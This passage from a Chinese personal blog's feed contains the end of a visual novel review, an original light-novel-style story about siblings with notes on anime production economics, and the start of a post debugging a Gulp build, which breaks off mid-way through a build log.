id="月社妃"><a href="#月社妃" class="headerlink" title="月社妃"></a>月社妃</h3><blockquote><p>身份：琉璃的妹妹</p></blockquote><p>「跨越伦理之爱，于神之膝下双双殉情」</p><p>妃之为悲剧故事的主角，她冷静且合理，纯洁的恋情并不限于与琉璃的兄妹之身，而体现于她甘愿为爱献身，体现在于她宁愿对方幸福。</p><p>再看看ルクル这个剧本家。ルクル身为出色剧本家的同时，因其剧本多有情感羁绊强大的妹系角色，被称为“妹妹大师”。ルクル对琉璃的妹妹妃自然没有少写。妃这个人物的塑造无疑是非常出色的，她是全作品最自由的存在，与魔法书反抗到底的存在，从另一个角度而言，她赴死的时候便已经放弃了对琉璃的爱恋，即便后期复活也要无视对琉璃的爱恋而对魔法书的存在反抗到底，她是本作品最体现存在主义思维的人，拥有着崇高的自尊与不羁的自由。但我对妃的情怀并非源于我的妹控情结。更露骨地讲，我并不喜欢妃这个妹妹角色。不过这只是初次游玩的体验。</p><h3 id="伏见理央"><a href="#伏见理央" class="headerlink" title="伏见理央"></a>伏见理央</h3><blockquote><p>身份：图书馆佣人</p></blockquote><p>「非人道主义的爱恋，名为疯狂」</p><p>理央之为悲剧故事的主角，她诞生于纸上，却与无法恋爱的宿命不惜以生命相抗。</p><p>在夜子自我封闭时，理央在门口显现的冷酷表情令我怀疑夜子是否改写了理央，不过后来在学校遇到了理央时，令我觉得她的内心还是盼望着琉璃来拯救尼特少女的。</p><h3 id="克利索贝利露"><a href="#克利索贝利露" class="headerlink" title="克利索贝利露"></a>克利索贝利露</h3><p>「憎恨中重生的邪恶魔法使，摆弄剧场的人偶」</p><p>真名阿蕾克莎多利亚，一个没什么好说的反派角色，后面的形象扭转显得突兀，而且来了个令人措手不及的 H-scene。但其身份何来值得探究，这并未在原作中写出，那就稍微推理一下吧。</p><p>克利索贝利露有几句非常关键的话：“妾只不过是现象”、“比书更为本质的存在”</p><p>正如言语是心灵的派生那般，克利索贝利露是魔法书的现象。是谁写的魔法书？为什么克利索贝利露具有微弱的可以写出魔法之书的能力？</p><p>游行寺家的人是不是只能写出书，而不能写出魔法使那样的存在？如果是，克利索贝利露的书出自何人之手？</p><p>克利索贝利露之所以为了夜子而不顾一切摆弄魔法书，是出于她的同情。</p><p>如果所有假说成立在诅咒不现实的情况下，弄清楚受诅咒的魔法使传说究竟是怎么回事，白发赤瞳的少女为憎恶化身的恶魔，还是被人创造出来的存在。</p><p>从时间线看，克利索贝利露的出现应该是在初二时的彼方向琉璃告白之后，而那时夜子并没有写魔法之书，因为夜子开始写魔法之书在故事的后端，以与彼方的一段不经意的对话体现出来，故可以排除克利索贝利露是夜子创造的魔法之书。</p><p>克利索贝利露的存在推理其一：游行寺暗子编写的名为克利索贝利露的纸上魔法使，为了在她死后有人能保护夜子，而所谓白发赤瞳的诅咒魔法使只是扯淡。</p><p>克利索贝利露的存在推理其二：本为纸上之人的克利索贝利露不应具有写出魔法之字的能力，故其存在正是传闻中的诅咒少女——从很久以前就诞生的存在其事实才能引发这样的传闻，原本白发赤瞳仅为不详的象征，传闻扩散后才变成人人讨厌的存在。顺着这条推理联系第十三章可推测，火灾后的克利索贝利露立马被不知以何种方式写成了魔法使的书，成为谣言中的存在。</p><h3 id="十三魔法之书"><a href="#十三魔法之书" class="headerlink" title="十三魔法之书"></a>十三魔法之书</h3><ol><li><p>翡翠的排挤原理</p></li><li><p>红宝石的天作之合</p></li><li><p>蓝宝石的存在证明</p></li><li><p>紫水晶的怪异传说</p></li><li><p>磷灰石的怠惰现象</p></li><li><p>芙蓉石的长年隔绝-芙蓉石的终焉轮回</p></li><li><p>黑珍珠的求爱信号</p></li><li><p>萤石的时空残影-萤石的怠惰现象</p></li><li><p>白珍珠的泡沫爱慕-绿幽灵水晶的命运连锁</p></li><li><p>黑曜石的因果目录</p></li><li><p>缟玛瑙的不在证明</p></li><li><p>青金石的幻想图书馆</p></li><li><p>璀璨的紫翠玉</p></li></ol><h3 id="浅谈纸上魔法使"><a href="#浅谈纸上魔法使" class="headerlink" title="浅谈纸上魔法使"></a>浅谈纸上魔法使</h3><p>并不给予纸上魔法使 Galgame 的称号而是视觉小说是因为纸上魔法使是一个直线型故事讲述模式而不是一个攻略喜爱女孩子的恋爱游戏。</p><p>奔着桐叶的废萌画风而来的玩家也几乎都是躺着出去的，这也是其评论两极化的原因之一。</p><p>原本我也只是想缓解一下「青空下的加缪」遗留的 PTSD，没想到又被毒奶了一波 qwq。</p><p>如果说人物塑造是本作最亮的点，那么纸人的设定就是本作最致郁的点。</p><p>纸人的身体特征、性格、喜好、技能都可以通过改写书的内容来实现，这样就仿佛一个个受人玩弄的人偶，在潘多拉的狂乱剧场里上演着人偶戏。假如代入角色很深，你便会深刻体验到当自己的感情被肆意玩弄时的无奈与绝望。当你以为你和妃深深相爱时，蓝宝石的存在证明会告诉你这只不过是故事需要而已。当你经历了芙蓉石的长年隔绝，深深爱上伏见理央这个可爱惹人同情的角色时，他会突然告诉你这只不过是一个纸上设定的人物，她的记忆是虚伪的，她的感情是设定的。这种种令我在整个游玩过程都是陷入十分低迷的状态。</p><p>特典以猫的视角抒发了编剧对角色的看待，这是我颇喜欢的风格，因为我此前写不交换视角的妹系小说时，就喜欢写妹妹视角的总结。</p><p>本作艺术性较高，擅长心理和细节描写，也令我认识到了ルクル这位出色的剧本家。虽然这主线在某些方面为人诟病，但魔法书的设定足以打开玩家一个看待事物新的视角与想象的空间，总而言之还是瑕不掩瑜。</p><p>与其说是我们以更高维度在游玩这部游戏，更像是这部游戏在不断地暗示般抛砖引玉来诱发我们的各种对存在与爱恋的思考。</p><p>名副其实的精彩作品，我永远喜欢日向彼方.jpg</p><h2 id="青空下的加缪"><a href="#青空下的加缪" class="headerlink" title="青空下的加缪"></a>青空下的加缪</h2><p>原名：青い空のカミュ<br>类型：视觉小说<br>开发商：KAI<br>剧本：〆鯖コハダ<br>原画：〆鯖コハダ<br>主线时长：10 h -<br>全线时长：10 h +<br>主要人物：込谷燐、三间坂萤、大本大人、聪</p><blockquote><p>―――纵使世界错乱了、纵使迷失了世界―――<br>这是两个少女联结羁绊的三日物语<br>仅仅是完美的日常中扭曲的不合理<br>天空蔚蓝无尽，澄澈地如同毫无意义<br>Qui a tué fille (是谁杀死了少女)<br>只想知道那件事情</p></blockquote><h3 id="浅谈青空下的加缪"><a href="#浅谈青空下的加缪" class="headerlink" title="浅谈青空下的加缪"></a>浅谈青空下的加缪</h3><p>PTSD 病患表示不想讲话……我是真没注意到游戏标着的凌辱标签，我甚至以为 Hs 都没有，因为我在社区里看到的评价是“重口”，我心想一个哲学作品怎么会有凌辱呢然后吃了大亏。</p><p>此游戏也在众多社区呈现激烈两极化（你可以喜闻乐见），在 bangumi 大多偏向好评。</p><p>喜好读书的人大概会知道加缪，他是不同于萨特本源的一种存在主义。我并没完全理解游戏种种暗示与细节，自从我玩过炒饭的 Tiny snow 以来，真没想到还能接触到有着如此深刻存在主义哲学的视觉小说。</p><p>讲到存在主义和虚无主义的 Galgame，肯定有人想提起素晴日，不过我还尚未开始玩素晴日。</p><p>在社区中，它被称为“哲学电波系”作品，接收到相应电波的人自然会去尊重这部作品。你可能在一秒之内爱上它，也可能在一秒之内厌恶它。</p><p>至于我为什么会受凌辱场景如此大的刺激，还得从去年的妹扔书说起……妹扔书是一部非常非常“好玩”的作品，我极力推荐妹控们去玩，PTSD 算什么，只不过打了两天两夜的恐怖游戏就可以缓过来的东西。</p><p>一个为令人愤懑的悲伤，一个是名为绝望的悲伤。</p><p>这个世界观令我联想起了夏娜那种偏魔幻现实主义的世界。</p><p>以上为当时游玩做的笔记，时间太久无法作更多浅谈。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>今天是读书日，不过读书是不可能读书的，当然是要玩数独啊！</p><p>近期沉迷 PCR，两个号都打到了第七章。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>How to walk tiny little life</title>
      <link href="archives/how-to-walk-tiny-little-life.html"/>
      <url>archives/how-to-walk-tiny-little-life.html</url>
      
        <content type="html"><![CDATA[<p>动画——</p><p>用日语读就是 “Anime”</p><p>翻译过来就是 “吖你面” 的意思……</p><p>总而言之，就是个抢饭碗的行业。</p><p>这正是我——福原友章正面临的状况。</p><p>在这个弱肉强食的行业，我应该是属于食物链底端的存在，稍有不甚便会被“猎肠者”*开膛破肚。如果用偏差值来计算的话，我一定是垫底的，但我的在校学习成绩可是很好的哦，真的真的哦，没骗你。【NETA 从零开始的异世界生活，一个危险敌对角色】</p><p>食物链的顶端一般是狮子或者老虎之类的，而底端则是可爱的兔子或者猫猫狗狗之类的。而我属于后者，也就是说，我与兔子一样可爱。不过这么来说，越弱的生物便越可爱，我比兔子还弱，那么我比兔子还要可爱，好耶，可爱万岁，可爱就是正义！【NETA 游戏人生，主角的台词】</p><p>这时，“咔哒”一声，刚才还在想着些没有营养的东西的我打开了自家客厅的门。</p><p>「我回来了」</p><p>「欢迎回来……」</p><p>熟悉得不能再熟悉的声音夹杂着一丝慵懒的气息从沙发的背部传出。</p><p>那家伙，又在吊儿郎当。</p><p>我无奈地嘀咕道，谁让声源处的那个人是我福原友章既可爱又自傲的妹妹福原里香呢。</p><p>嘛，可不可爱嘛。</p><p>毕竟只有我和她待得最久，所以我的感想也并不会附上太多的主观，从一般人的标准来看的话，应该是属于非常可爱的那种类型吧。</p><p>「好慢啊，8 点档动画都看完了」</p><p>……如果改掉这看不起人的臭性格的话就更加可爱了。</p><p>话说回来，上班真是累死人啊。</p><p>俗话说，五点下班变成人*，我这是晚上八点才能变回正常人。【NETA 指日本五点下班的上班族充满活力】</p><p>我扯开领带，想让闷了一整天的胸口透透气。</p><p>随即从包里拿出一份文件，走向沙发。</p><p>「里香，之前你说想去的声优事务所的一些入职介绍，我整理了一下都在这里了」</p><p>「还有，如果决定了的话，你要把一月到三月的下午的课程空出来，有培训班要去」</p><p>躺在沙发一动不动盯着平板屏幕看的妹妹把头转向了我，然后茫然地指了指自己的脸，见我点了点头后她便嫌弃地皱起了眉。</p><p>这里就我们两个人，难道你想说我家的厕所还会出现花子吗，那你绝对是不乖乖听话的妹妹。【NETA 日本都市传说“厕所里的花子”】</p><p>再说不是你说要当声优然后手舞足蹈地拜托我的吗？怎么搞得像是我在拜托你一样。</p><p>我是工作人，也就是社畜，目前在动画行业做着制作助理的工作。</p><p>而我家的妹妹则是个名存实亡的大学生，不爱学习空抱理想的人所特有的坏习气在我家妹妹身上显露无疑，比如自傲的性格，比如以前的我……难道是受了我的影响？不不不，怎么可能呢、可能？、大概是？……对不起我的可爱妹妹，把你带成这个样子全部是我这个哥哥的错。</p><p>我一副欲哭无泪的表情正好被里香撞见了。不好，好尬，好尴尬……</p><p>「大学那边的话不要紧，由于去年一直没工作所以学分基本都是满的，而且在学校也没什么朋友，也不会有什么事」</p><p>我的妹妹直接无视了我。好，真不愧是我的妹妹！</p><p>为了不让我家妹妹变成彻底的干物妹，同时作为一个负责的好哥哥，我一直在争取能让里香在声优事务所实习的机会。</p><p>其结果就是，在面试被刷下来三次之后，嘴上就开始不要不要地拒绝了……虽然最后还是去了。</p><p>最近才好不容易靠我的关系介绍进了一家不错的事务所。</p><p>「那个、友章哥，是不是没有人要我了」</p><p>「哦？是吗」</p><p>是吗，这么快就开始考虑男朋友的事情了吗，那种事情不是你这个年纪考虑的吧……不对，好像已经是那个年纪了，倒不如说没有男朋友才会显得奇怪……咦？奇怪？怎么感觉鼻子有点发酸。</p><p>「你看嘛，明明人家什么都愿意做，还有这么多优点，面试的那群混蛋却看不到，嘴里说着什么这个怎么样，这个不行吧，一想到就来气，为什么那种家伙能在那里工作啊，那家事务所的老板一定有问题，要不就是没事干，这大概就是业界的堕落啊」</p><p>哦哦，原来是说这个啊，混蛋啊，还我的感情……</p><p>你还真把自己当成被人捧在手心的宝石了，真让人担心她是不是能好好独立……业界的堕落这句话还轮不到你个臭新人来说。</p><p>「那你来说说你有什么优点？」</p><p>「自信……可爱？再说了，什么都愿意做不已经是最大的优点了吗？」</p><p>空调马达一边发出嗡嗡响声，一边安静地将热风送出来。</p><p>外面还有汽车驶过柏油路面的声音，填充着我和里香之间寂静的空气。</p><p>什么都愿意做这种话无论谁都会说，无论谁都能说，可人家要的既不是你的口头承诺也不是让你做些勉为其难的工作，看人的标准不是你的长相，而是你能做什么，什么都不会的人要了也只是吃大锅饭，甚至可能成为饭里的老鼠屎。</p><p>雇佣制度是一种有倾向性的制度：对资方有利，对劳方不利。劳资双方并不平等，劳方只有被动地接受资方的决策。这种不平等正是雇佣制度的本质，这既是我从工作中学到的经验，也正是我家妹妹——福原里香所面临的状况。</p><p>而且，什么都愿意做这句话从一个女大学生口中说出来便会莫名带点 H 的气息，所以拜托请不要在外人面前随便说这种话，万一被误解了怎么办？作为一个哥哥如果被别人用那种质疑是不是一个好哥哥的眼神来看的话是会非常伤心的。</p><p>我沉默着思考着，本来这种东西不是自己去觉悟是没有意义的。像我这样愿意帮忙很大一部分也不仅仅是里香很可爱的原因。</p><p>这时我不经意地望向正因为陷入尴尬气氛不知所措而又欲言又止的妹妹，可恶，好可爱……</p><p>如果这是 Galgame，此时玩家面前会出现两个选项。</p><p>一是直接点破，谎称我的妹妹并不可爱，也没什么实在的能力，让她乖乖面对现实。而事实看来，我的妹妹是相当可爱的。最重要的是说者无心听者有意，就算我们是关系再亲近的兄妹，彼此之间再清白的语句也有可能被对方误解为带恶意的谎言，而我便会被妹妹当成一个既不会 ky* 也不善解人意的人，然后逐渐被妹妹讨厌，最终走入 Bad End。【NETA ky: “空气”，形容读气氛】</p><p>二是去不停地夸里香，夸她的难度倒是不高，靠膝盖想的话我一秒就可以想出十个*。但问题是听完后，她很可能、不、绝对会！趾高气昂地大笑出来，说出什么果然我是天才之类的胡说八道，然后被自我膨胀诱发的盲目自信引发了第一次工作的失败被赶了出来，从此一蹶不振成为干物妹，最终走入 Bad End。【*这句话的意思是不经大脑思考，也就是瞎扯】</p><p>正因为我从事的工作中成天都是谎言，所以我想尽可能地在私生活中使用真话。</p><p>而我也不可能去附和她的优点，批评和夸赞到了一定程度，就会变成伤人和谎言。</p><p>不管是哪边，都要维持在一个精准的平衡点。</p><p>这样一来，我所能说出的话就极其有限……</p><p>「对啊对啊，里香好可爱，里香好可爱，里香最可爱了」</p><p>「……你绝对不是那样子想的吧？我怎么觉得你在看不起我？」</p><p>里香泪眼汪汪地望着我。</p><p>让对方觉得我在糊弄她，做到此而不让对方生气的方法便是重复一个夸人的语句。</p><p>重复一个语句可以让其核心内容的价值和可信度降低——这是对话的一个高级技巧，能让原本不是谎言的句子听起来就像谎言一样，而对方也能察觉出这句话的真实含义，简直是放在法庭都可以打赢官司的交流术。</p><p>来由便是初中向女生告白时由于太激动而在一句话中重复了三次告白，然后被干脆地甩了……</p><p>不过这对我的妹妹奏不奏效我也不清楚，姑且看她的表情还是有用的吧，她能明白就好了，不用我这个哥哥去点明是最好的啦，少了麻烦又解决了问题。</p><p>清空了思绪后，我开始放水洗澡。</p><p>「啊啊~~！」</p><p>身体刚浸入浴缸的舒适感让人忍不住发出了呻吟。</p><p>「真少见诶，你居然会在泡澡时发出叫声」</p><p>门外突然传来里香的吐槽。</p><p>为什么你会在我浴室门外啊。</p><p>我把头转向门口，用小到一定程度的声音说了一句：</p><p>「要你管啊」</p><p>哎，先不管她了，现在是 relaxing time！</p><p>像是游泳预备队员似的，我将深深吸进肺部的水蒸气和一天下来所积累的不快随着二氧化碳一遍一遍地吐了出来。</p><p>然后，待机休眠，进入“节能模式”。【NETA 冰菓 屏蔽大多来自外界的干扰，使身体耗费精力最少的一种状态】</p><p>……</p><p>明明人家也是有好好努力的嘛，为什么就是不直接夸夸人家嘛，还要用那种说法，真是不诚实啊，友章哥。</p><p>我躺在沙发上看着事务所的介绍。</p><p>直接说出口的话又感觉是在求对方夸我，回答肯定也失去了真实性。再说，我也不是小孩子了。</p><p>不过为什么我这么想听到别人的夸奖呢？肯定都怪那个友章哥平时夸我夸得不够。现在的我，可是不夸就没干劲的少女，多夸夸我就可以让我去勤劳工作了，反正只是动动嘴就算是谎言也好，可以让对方满足，这么轻松的工作却没人来做真是奇怪。</p><p>抢饭碗，说得好听点，就是竞争激烈。</p><p>P*、监督、作画、演出、摄影、制作监督、还有我所向往的行业——声优等等，这些杂七杂八的人组成了友章哥所在的行业——动画制作。【P: Producer制片人】</p><p>就像画师不仅可以在动画行业工作一样，声优的工作并不止动画配音，还有游戏配音、广告配音、广播剧、娱乐活动之类的，不过都与我这个新人没什么关系。</p><p>严格来说，我也不知道自己算不算得上声优新人，因为我并没有接过配音，甚至试音都没有过。如果按照会配音而不是配过音来定义声优，那么全世界人应该都可以成为声优了，所以理论上我并不是声优。不过在社会上只要有了一个职位的称号，就会因此显得比较成熟，也可以和周围的人说，啊啊工作好累啊出去大吃一顿好了，不管哪边，对我蠢蠢欲动的心灵都有着充满魅力的诱惑。</p><p>「这部 Anime，真想看到第二季啊」</p><p>随便扫了一下事务所的介绍，我便将其帅气地甩到了桌上，然后拿起平板查资料，当然不是声优工作的资料，你在想啥呢。</p><p>『Hakumei to mikochi』（妖精森林的小不点），正是我正在浏览的漫画改动漫。封面是两个卡通化人物，看起来非常有童话剧 poi。</p><p>动画是 12 集 + OVA* 共 27 话，平均每两话漫画做出一集动画。【*国内某 B 是第 13 话】</p><p>像这样的日常动画，以一般动画 300 cut 来算的话，这部动画应该是小于标准。原画没有很细腻的肢体动作，中间帧也不像战斗类那么多要求，演出和摄影也没有多少戏份，3D 更不用说，总之就是制作难度不高。说白了点，没那么烧钱。</p><p>而一部动漫的制作，一般只有两种途径。一是动画公司自己投资创作，二是委员会委托创作。前者的制作大多来源情怀，而后者只是一个单纯拿工资的。一般动画的制作涉及很多方的利润问题，比如电视台、广告、周边，所以一般都是由投资方出资制作的。</p><p>一部动漫的续作会因为作画风格等种种原因，一般是交给前作的负责公司，不过前提是要有钱、要能赚钱，钱的来源可以是自己出也可以是投资，后者居多也正是为什么有如此多的动漫都是人气轻小说漫画游戏改编。</p><p>出于情怀创作自主投资的典型例子就是京都。</p><p>投资制作一般会结合前作各种因素再决定如何制作续作。但也有先播吸引投资再播的例子。（比如国内的镇魂街2）</p><p>假如把电视台比作你（委员会）家楼下的房东，那么动画公司就可以比作房东的儿子。</p><p>现在房东想把房子租出去，需要进行“宣传”，宣传到位了，钱也就赚到了。</p><p>房子卖的好了，了解的人多了，房东还可以通过各种途径赚钱，如“买房再出租”、“将房子空出来作为拍电影的场所”、“找人来翻修房子”。</p><p>房东儿子在这里就没有任何作用了，房东儿子仅仅可以帮房东算账看房子。</p><p>动画是赚钱的商业手段，会动的美少女背后并不仅仅是轻松的日常，有些动画的口碑再好，没有利润也是白谈续作。</p><p>常说的 BD 销售在动画行业的利润占比其实并不是很高，稍微计算便可得知。一部 12 话每话 20 min 的标准动画成本大约在 1.5-3 亿日元，BD 若以单价 6000 日元计算，5000 销售额的利润便是三千万日元，这还只是毛利，不可控制成本肯定无法避免。一般来说深夜档动画会卖得多，但销量高也并不一定代表利润高，比如轻音 2。</p><p>不过 BD 的销量一般可以衡量其他周边的销量，所以有些动画会以 BD 销售额作为第二季制作的基石。</p><p>同为基石的当然还是原作量，原作量不够也是难产，甚至经常出现靠广播剧和 CD 来填剧情的现象。</p><p>不过目前漫画更至 62 话且一直在以 ONC 形式更新，原作量上是没什么问题的。</p><p>总而言之，这个奇怪的行业却能产出不奇怪的动画，也是件奇怪的事情了……</p><p>不过这些知识都是从友章哥那里听来的，他好像说了一部叫什么白箱的动画哎管他呢肯定不是什么有意思的作品。</p><p>「哦哦，这个叫 Lerche 的动画制作公司居然还制作过『机巧少女不会受伤』」</p><p>我正在 Oricon 网站上找这部『Hakumei to mikochi』的 BD 销量，自然而然看到了同家公司的作品。</p><p>「啊啊是『昂宿七星』、还有『游戏三人娘』和『彼方的阿拉斯加』，好厉害的公司，我以前都不知道」</p><p>「哦哦！这是欠了一个诺贝尔和平奖的芳文社的『学园孤岛』」【NETA 因为芳文社作品以百合、萝莉为主体，常被视为世界和平的象征】</p><p>静不下来静不下来……我开始在沙发上手舞足蹈。</p><p>我在沙发上抬起头，正对上头发还有水滴残留的友章哥那看疯子般的眼神。</p><p>「……你怎么了？」</p><p>「没什么……做做运动做体操，瑜伽那些的」</p><p>我敷衍了几句，翻了个身，继续埋头盯着平板。</p><p>「这样吗，没想到你会的挺多的」</p><p>「一般般吧」</p><p>友章哥去厨房倒了杯水，然后走到沙发边朝我打了个手势示意我让开。</p><p>「话说啊，友章哥」</p><p>「嗯？」</p><p>「为什么这些动漫的 BD 没什么销量啊」</p><p>我把刚刚查到的 Lerche 公司信息通过平板递给友章哥。</p><p>「『妖精森林的小不点』还说得过去，但是为什么『昂宿七星』只有 58 销售量啊」</p><p>「这种事情不是个人喜好吗，就算你问我我也不知道怎么说啊」</p><p>「是没有人喜欢吗？明明是那么好的作品？轻小说也是令人非常感动的说？这不是很异常吗？友章哥？」</p><p>我一步步逼问着友章哥。</p><p>「那个……」</p><p>一回头正好和我对上目光的友章哥表情突然慌张了起来。</p><p>好近，太近了……</p><p>察觉到这一点的我，因为觉得害臊也把脸扭开了。</p><p>我和友章哥分别占据沙发的两端。我偷看了他一眼，他扭头背对着我。</p><p>像是在缓解紧张的情绪，我用手指一圈圈地卷着头发。</p><p>……我们是兄妹啊，所以这种事情我向来没有在意过。</p><p>不过一旦开始在意了，就会变得非常难为情，这让我不由得移开了视线……奇怪，明明天气不热，为什么感觉脸颊有点发烫。</p><p>……</p><h2 id="本篇"><a href="#本篇" class="headerlink" title="本篇"></a>本篇</h2><p>真是令人羡慕的兄妹！为了说出这句话，花了将近五千字。</p><p>我也好想要个能陪在我身边开玩笑说着啊看哥哥又在傻笑了的可爱妹妹啊！</p><p>现在正处于春夏的换季，天气一会儿冷，一会儿热的，让人静不下心去学习。时间也是不知不觉就来到了高考 90 天，就算是以前怎样都无所谓的我也感到了压迫感，看着这对自己亲笔写出来的兄妹的日常故事，要加油不输给他们的想法也在我脑中回响着。</p><p>这次写的是福原友章和福原里香兄妹的日常，大家还喜欢吗？这个原本没多少计划的短篇，不知不觉间写了一天的时间，也写到了接近五千的字数。原本只是想写最近的一些事情，干脆就用轻小说的形式写了。这篇短文由一丝丝灵感和一丝丝冲动、还有人生几千亿分之一的时间构成，要素包含了福原兄妹日常和动画科普。实在想不出怎么写却又不想借用以前的原创时，就从家里的几本轻小说借用了一些描写，痕迹可能也比较明显，大家看得开心就好了。动画科普中的知识大多来自「SHIROBAKO」（白箱）这部动画还有来自知乎的补充科普，真心感觉每个奋力的创作者都是非常可爱的呢！写的时候还想到了很多梗，因为记不太清了和剧情限制就没写上去。</p><p>说到白箱，最近出了其剧场版的主视觉图，真是非常令人期待她们之间后续的故事。</p><p>这次为了更好地衬托写作主题——日常，将短篇的背景设在了日本 2017 年的冬季，正好是『妖精森林的小不点』这部动漫的播出季。最近正好也二追了这部温馨日常童话剧 poi 的小故事，不得不让人感叹到，真是令人向往的生活啊。</p><p>如果可以的话，我还是非常想继续写这对兄妹之间的故事，不过这也只是脑中的想法而已。人的脚步停下来的话，也就不知道前方的路长什么样。</p><p>日常的价值是非凡，而我也要逐渐从一种日常状态转为另一种日常状态了。过多的无用信息在占用着我的时间，最近也在考虑着要不要换个圈子，不擅长交友连换个圈子都难，不过总有办法的吧！</p><p>宅久了偶尔也会冒出“啊啊自己果然不行啊”的想法，不过一想到在我的周围还有很多支持着我期待着我的人，我也会觉得不能辜负他们，特别是我的三年级国文老师，你现在过得如何呢？</p><p>家母也并没有因为我的游手好闲而督促我去上网课，偶尔有些真心话无法说出来的时候，就会觉得亲人也并不一定是最亲近的人，而可能是最亲近的陌生人。虽然非常的无情，但也是对我而言的事实。</p><p>最近的 kano VR live 对我一介高中生来说预算成本太高了，所以并没有去现场的准备。</p><p>最近弃了 Sublime 并将 Markdown 的编写工作全部转移到了 VScode MPE。</p><p>说起来啊，昨天的我——不对，如果说 3 月 9 日 0 时前的我是『昨天的我』，那么过了 3 月 10 日的0 时，『昨天的我』又会变成『前天的我』，如果照此推下去，『昨天的我』这种说法并非一个可靠的印象。可如果把『昨天的我』解释成过去的我那就说得通了，而过去的我又是每个时间段的我的结合体，也就是现在的我，所以，昨天的我=过去的我=现在的我。</p><p>总之，3 月 8 日的晚上几乎从来没看过 B 站动态、B 站一天点击数不超过 3 次的我在偶然的搜索中进入了 B 站的动态页然后开始闲逛起了 vtb 们的动态。</p><p>如果仅是这样还没什么好说的，我竟然翻出了西电在 4 小时前的招生宣传片投稿。</p><p>这肯定是一种象征，hahaha，kadana！【NETA 少女编号，一句津津乐道的台词，意思是“赢了”】</p><p>这次是用写轻小说的形式来写的博文，所以很多平时不常说的话或是不好表达的话都可以较无忌惮地写出来。同时我也十分担心自己是否有将轻小说的魅力展现出来，科普是不是有做的不到位的地方。另外我在关于我的介绍和 2019 年度总结中提及的轻小说是与上面这篇故事无关的。</p><p>如果我的板绘达到了拿得出来见人的水平，我也会非常乐意画出可爱的福原兄妹。</p><p>下次再见吧！</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Gulp 的神奇 BUG</title>
      <link href="archives/gulp-de-shen-qi-bug.html"/>
      <url>archives/gulp-de-shen-qi-bug.html</url>
      
        <content type="html"><![CDATA[<p>大概在年初一月多时被友人提醒了我的博客访问可能出了问题<a id="more"></a>，后半信半疑地在隐私模式打开博客确实发现了一些问题，再拿去 Google insight 也出现了一样的问题，这才开始了 Bug 的分析。</p><p>异常如下：</p><div>    <img src="https://i.loli.net/2020/03/11/eXpJ5rUzEnwAk8Q.png" style="max-width: 49%">    <img src="https://i.loli.net/2020/03/11/S2GvCh7nyjKPgUb.png" style="max-width: 49%"></div><p>check console，没有重大警告或者错误。</p><p>check network，无异常。</p><blockquote><p>Cloudflare proxy 已关闭</p></blockquote><p>当时近期的改动便是 Gulp。将 node_modules 重装一遍异常页面依旧。</p><blockquote><p>刚开始使用 Gulp 时，build 网页是可以正常访问的，故之后的每次 build 便懒得去检查页面的是否正常显示。</p></blockquote><p>从 gulpfile.js 中逐一分析排查出了 Bug 的位置，是在 compressJs。</p><p>再将有执行 compressJs 的和没有执行的分别保存为 html 并 diff</p><p>神奇之处出现了————</p><p>这两个文件除了端口号不同，其他都一致。</p><blockquote><p>端口号的不同是由于使用 Brackets 在 Chrome 动态调试的结果。</p></blockquote><p>懵了一圈后去命令行找了找 gulp build 的输出 log</p><p>如下————</p><pre><code>INFO  178 files generated in 1.9 s[18:46:46] Finished &#39;generate&#39; after 3.56 s[18:46:46] Starting &#39;compressHtml&#39;...[18:46:46] Compress HTML: public/404.html[18:46:46] Compress HTML: public/index.html[18:46:46] Compress HTML: public/laycomment.html[18:46:47] Compress HTML: public/about/index.html[18:46:47] Compress HTML: public/archives/2019-nian-du-zong-jie.html[18:46:47] Compress HTML: public/archives/bu-shu-gitalk-chu-xian-de-keng.html[18:46:47] Compress HTML: public/archives/gulp-de-shen-qi-bug.html[18:46:47] Compress HTML: public/archives/how-to-walk-tiny-little-life.html[18:46:47] Compress HTML: public/archives/index.html[18:46:47] Compress HTML: public/archives/lu-nai-samfree.html[18:46:48] Compress HTML: public/archives/material-geng-duo-xin-xi.html[18:46:48] Compress HTML: public/archives/our-end-of-the-world.html[18:46:48] Compress HTML: public/archives/tzmcm-bi-sai-guo-cheng-jie-guo.html[18:46:48] Compress HTML: public/archives/xian-chong-du-bao-zha-ba.html[18:46:48] Compress HTML: public/archives/yin-se-feng-jing.html[18:46:48] Compress HTML: public/archives/zai-html-zhong-yong-js-cao-zuo-json.html[18:46:48] Compress HTML: public/categories/index.html[18:46:48] Compress HTML: public/links/index.html[18:46:49] Compress HTML: public/kami/index.html[18:46:49] Compress HTML: public/timeline/index.html[18:46:49] Compress HTML: public/archives/2020/index.html[18:46:49] Compress HTML: public/archives/2019/index.html[18:46:49] Compress HTML: public/categories/日常/index.html[18:46:49] Compress HTML: public/categories/代码/index.html[18:46:49] Compress HTML: public/categories/知识/index.html[18:46:49] Compress HTML: public/categories/随想/index.html[18:46:49] Compress HTML: public/page/3/index.html[18:46:50] Compress HTML: public/page/2/index.html[18:46:50] Compress HTML: public/archives/2020/01/index.html[18:46:50] Compress HTML: public/archives/2020/02/index.html[18:46:50] Compress HTML: public/archives/2020/03/index.html[18:46:50] Compress HTML: public/archives/2019/09/index.html[18:46:50] Compress HTML: public/archives/2019/07/index.html[18:46:50] Compress HTML: public/archives/2019/10/index.html[18:46:50] Compress HTML: public/archives/2019/11/index.html[18:46:50] Compress HTML: public/archives/page/3/index.html[18:46:50] Compress HTML: public/archives/page/2/index.html[18:46:50] Compress HTML: public/archives/2019/page/2/index.html[18:46:51] Compress HTML: 38 items[18:46:51] Finished &#39;compressHtml&#39; after 4.69 s[18:46:51] Starting &#39;compressCss&#39;...[18:46:51] Compress CSS: public/css/disqus-proxy.css[18:46:51] Compress CSS: public/css/duoshuo.css[18:46:51] Compress CSS: public/css/gitalk.css[18:46:51] Compress CSS: public/css/ie-blocker.css[18:46:51] Compress CSS: public/css/material-icons.css[18:46:51] Compress CSS: public/css/material.css[18:46:51] Compress CSS: public/css/prettify.css[18:46:51] Compress CSS: public/css/style.css[18:46:51] Compress CSS: public/css/uc.css[18:46:51] Compress CSS: 9 items[18:46:51] Finished &#39;compressCss&#39; after 948 ms[18:46:51] Starting &#39;compressJs&#39;...[18:46:52] Compress JS: public/js/MathJax.js[18:46:53] Compress JS: public/js/Valine.min.js[18:46:54] Compress JS: public/js/clicklove.js[18:46:54] Compress JS: 